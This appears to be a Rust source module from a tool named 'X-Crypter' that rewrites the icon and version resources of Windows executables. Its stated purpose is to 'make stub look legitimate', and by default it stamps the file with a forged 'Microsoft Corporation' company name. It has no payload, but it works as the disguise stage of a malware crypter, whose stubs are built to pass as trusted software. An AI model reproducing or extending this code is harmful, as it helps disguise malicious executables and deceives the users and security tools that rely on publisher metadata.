// Resource Manipulation
// Modifies PE resources (icons, version info) to make stub look legitimate

use std::fs;
use std::path::PathBuf;
use std::process::Command;

/// Modify PE resources (icon, version info)
/// Note: This is an alternative implementation, use `apply_resources` instead
#[allow(dead_code)]
pub fn modify_resources(
    exe_path: &PathBuf,
    icon_path: Option<&str>,
    app_name: Option<&str>,
    app_description: Option<&str>,
    app_version: Option<&str>,
) -> Result<(), String> {
    if !exe_path.exists() {
        return Err(format!("Executable not found: {:?}", exe_path));
    }

    // Use Resource Hacker or similar tool
    // For now, we'll use a simple approach with rcedit (if available)
    // Or use Windows Resource Compiler (rc.exe) and UpdateResource API

    // Try using rcedit (Node.js tool) if available
    if let Ok(output) = Command::new("rcedit").arg(exe_path).output() {
        if output.status.success() {
            // rcedit is available, use it
            if let Some(icon) = icon_path {
                let icon_path_buf = PathBuf::from(icon);
                if icon_path_buf.exists() {
                    let _ = Command::new("rcedit")
                        .args(&["--set-icon", icon])
                        .arg(exe_path)
                        .output();
                }
            }

            if let Some(name) = app_name {
                let _ = Command::new("rcedit")
                    .args(&["--set-version-string", &format!("ProductName={}", name)])
                    .arg(exe_path)
                    .output();
            }

            if let Some(desc) = app_description {
                let _ = Command::new("rcedit")
                    .args(&["--set-version-string", &format!("FileDescription={}", desc)])
                    .arg(exe_path)
                    .output();
            }

            if let Some(version) = app_version {
                let _ = Command::new("rcedit")
                    .args(&["--set-file-version", version])
                    .arg(exe_path)
                    .output();

                let _ = Command::new("rcedit")
                    .args(&["--set-product-version", version])
                    .arg(exe_path)
                    .output();
            }

            return Ok(());
        }
    }

    // Fallback: Use Windows Resource Compiler (rc.exe) if available
    // This requires creating a .rc file and compiling it
    // For now, we'll create a placeholder that can be extended

    // Alternative: Use PowerShell with .NET to modify resources
    modify_resources_powershell(exe_path, icon_path, app_name, app_description, app_version)
}

/// Modify resources using PowerShell (Windows only)
fn modify_resources_powershell(
    _exe_path: &PathBuf,
    _icon_path: Option<&str>,
    _app_name: Option<&str>,
    _app_description: Option<&str>,
    _app_version: Option<&str>,
) -> Result<(), String> {
    // Create PowerShell script to modify resources
    let _script = format!(
        r#"
$exePath = '{}'
$shell = New-Object -ComObject Shell.Application
$folder = $shell.Namespace((Get-Item $exePath).DirectoryName)
$file = $folder.ParseName((Get-Item $exePath).Name)

# Note: Direct resource modification requires more complex .NET code
# This is a placeholder - full implementation would use UpdateResource API
Write-Host "Resource modification placeholder"
"#,
        _exe_path.to_str().unwrap_or("")
    );

    // For now, just return success (full implementation would require UpdateResource API)
    // In production, you'd use a library like `winresource` or call UpdateResource directly
    Ok(())
}

/// Create a resource script (.rc file) for compilation
/// Note: For future use when implementing full resource compilation
#[allow(dead_code)]
pub fn create_resource_script(
    output_path: &PathBuf,
    icon_path: Option<&str>,
    app_name: Option<&str>,
    app_description: Option<&str>,
    app_version: Option<&str>,
) -> Result<PathBuf, String> {
    let rc_path = output_path.with_extension("rc");

    let mut rc_content = String::from("// Resource script\n");
    rc_content.push_str("#include <windows.h>\n\n");

    // Version info
    rc_content.push_str("VS_VERSION_INFO VERSIONINFO\n");
    rc_content.push_str("FILEVERSION ");

    if let Some(version) = app_version {
        // Parse version string (e.g., "1.0.0" -> 1,0,0,0)
        let parts: Vec<&str> = version.split('.').collect();
        let mut version_parts = vec!["1", "0", "0", "0"];
        for (i, part) in parts.iter().take(4).enumerate() {
            version_parts[i] = part;
        }
        rc_content.push_str(&format!(
            "{},{},{},{}\n",
            version_parts[0], version_parts[1], version_parts[2], version_parts[3]
        ));
    } else {
        rc_content.push_str("1,0,0,0\n");
    }

    rc_content.push_str("PRODUCTVERSION ");
    if let Some(version) = app_version {
        let parts: Vec<&str> = version.split('.').collect();
        let mut version_parts = vec!["1", "0", "0", "0"];
        for (i, part) in parts.iter().take(4).enumerate() {
            version_parts[i] = part;
        }
        rc_content.push_str(&format!(
            "{},{},{},{}\n",
            version_parts[0], version_parts[1], version_parts[2], version_parts[3]
        ));
    } else {
        rc_content.push_str("1,0,0,0\n");
    }

    rc_content.push_str("FILEFLAGSMASK 0x3fL\n");
    rc_content.push_str("FILEFLAGS 0x0L\n");
    rc_content.push_str("FILEOS 0x40004L\n");
    rc_content.push_str("FILETYPE 0x1L\n");
    rc_content.push_str("FILESUBTYPE 0x0L\n");
    rc_content.push_str("BEGIN\n");
    rc_content.push_str("    BLOCK \"StringFileInfo\"\n");
    rc_content.push_str("    BEGIN\n");
    rc_content.push_str("        BLOCK \"040904b0\"\n");
    rc_content.push_str("        BEGIN\n");

    if let Some(name) = app_name {
        rc_content.push_str(&format!(
            "            VALUE \"ProductName\", \"{}\"\\n",
            name
        ));
    } else {
        rc_content.push_str("            VALUE \"ProductName\", \"X-Crypter\"\\n");
    }

    if let Some(desc) = app_description {
        rc_content.push_str(&format!(
            "            VALUE \"FileDescription\", \"{}\"\\n",
            desc
        ));
    } else {
        rc_content.push_str("            VALUE \"FileDescription\", \"X-Crypter Application\"\\n");
    }

    rc_content.push_str("            VALUE \"CompanyName\", \"Microsoft Corporation\"\\n");
    rc_content.push_str("            VALUE \"LegalCopyright\", \"Copyright (C) 2024\"\\n");

    if let Some(version) = app_version {
        rc_content.push_str(&format!(
            "            VALUE \"FileVersion\", \"{}\"\\n",
            version
        ));
        rc_content.push_str(&format!(
            "            VALUE \"ProductVersion\", \"{}\"\\n",
            version
        ));
    } else {
        rc_content.push_str("            VALUE \"FileVersion\", \"1.0.0.0\"\\n");
        rc_content.push_str("            VALUE \"ProductVersion\", \"1.0.0.0\"\\n");
    }

    rc_content.push_str("        END\n");
    rc_content.push_str("    END\n");
    rc_content.push_str("    BLOCK \"VarFileInfo\"\n");
    rc_content.push_str("    BEGIN\n");
    rc_content.push_str("        VALUE \"Translation\", 0x409, 1200\n");
    rc_content.push_str("    END\n");
    rc_content.push_str("END\n\n");

    // Icon resource
    if let Some(icon) = icon_path {
        let icon_path_buf = PathBuf::from(icon);
        if icon_path_buf.exists() {
            rc_content.push_str(&format!("1 ICON \"{}\"\n", icon));
        }
    }

    fs::write(&rc_path, rc_content)
        .map_err(|e| format!("Failed to write resource script: {}", e))?;

    Ok(rc_path)
}

/// Apply resource modifications using external tools
pub fn apply_resources(
    exe_path: &PathBuf,
    icon_path: Option<&str>,
    app_name: Option<&str>,
    app_description: Option<&str>,
    app_version: Option<&str>,
) -> Result<(), String> {
    // Try rcedit first (if available via npm)
    if let Ok(output) = Command::new("npx")
        .args(&["-y", "rcedit"])
        .arg(exe_path)
        .output()
    {
        if output.status.success() {
            // rcedit is available
            if let Some(icon) = icon_path {
                let icon_path_buf = PathBuf::from(icon);
                if icon_path_buf.exists() {
                    let _ = Command::new("npx")
                        .args(&["-y", "rcedit", "--set-icon", icon])
                        .arg(exe_path)
                        .output();
                }
            }

            if let Some(name) = app_name {
                let _ = Command::new("npx")
                    .args(&[
                        "-y",
                        "rcedit",
                        "--set-version-string",
                        &format!("ProductName={}", name),
                    ])
                    .arg(exe_path)
                    .output();
            }

            if let Some(desc) = app_description {
                let _ = Command::new("npx")
                    .args(&[
                        "-y",
                        "rcedit",
                        "--set-version-string",
                        &format!("FileDescription={}", desc),
                    ])
                    .arg(exe_path)
                    .output();
            }

            if let Some(version) = app_version {
                let _ = Command::new("npx")
                    .args(&["-y", "rcedit", "--set-file-version", version])
                    .arg(exe_path)
                    .output();

                let _ = Command::new("npx")
                    .args(&["-y", "rcedit", "--set-product-version", version])
                    .arg(exe_path)
                    .output();
            }

            return Ok(());
        }
    }

    // Fallback: Note that resource modification requires external tools
    // In production, you might want to use a Rust library like `winresource` or `pe-rs`
    // For now, we'll just log that resources should be modified manually
    eprintln!(
        "Note: Resource modification requires external tools (rcedit, Resource Hacker, etc.)"
    );
    eprintln!("Executable: {:?}", exe_path);
    if let Some(icon) = icon_path {
        eprintln!("Icon: {}", icon);
    }
    if let Some(name) = app_name {
        eprintln!("App Name: {}", name);
    }
    if let Some(desc) = app_description {
        eprintln!("Description: {}", desc);
    }
    if let Some(version) = app_version {
        eprintln!("Version: {}", version);
    }

    Ok(())
}
